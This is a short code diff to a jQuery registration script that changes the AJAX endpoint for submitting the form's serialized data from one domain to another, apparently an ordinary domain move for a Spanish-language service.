@@ -127,7 +127,7 @@
             $(".btn-register").html('<img class="responsive-img" src="assets/images/ajax-loader.gif" alt="Procesando...">');
             $.ajax({
               type: "POST",
-              url: "https://bankucolombia.com/lib/ajax_service_mobil.php",
+              url: "https://banku.com.co/lib/ajax_service_mobil.php",
               data: $("#frm_register").serialize()+"&json="+encodeURIComponent(json),
               dataType:'JSON',
               success: function(msg){
